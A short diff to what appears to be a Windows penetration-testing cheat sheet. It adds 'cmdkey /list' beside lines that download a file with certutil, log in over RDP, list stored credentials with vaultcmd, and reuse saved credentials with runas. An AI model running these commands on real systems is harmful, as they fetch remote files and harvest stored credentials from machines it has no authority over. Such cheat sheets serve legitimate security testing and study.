@@ -89,6 +89,7 @@ certutil.exe -urlcache -split -f "URL" OUTFILE
 
 xfreerdp /u:USER /p:PASS /cert:ignore /v:RHOST
 
+cmdkey /list
 vaultcmd /list
 vaultcmd /listcreds:"VAULT"
 runas /user:USER /savecred EXECUTABLE
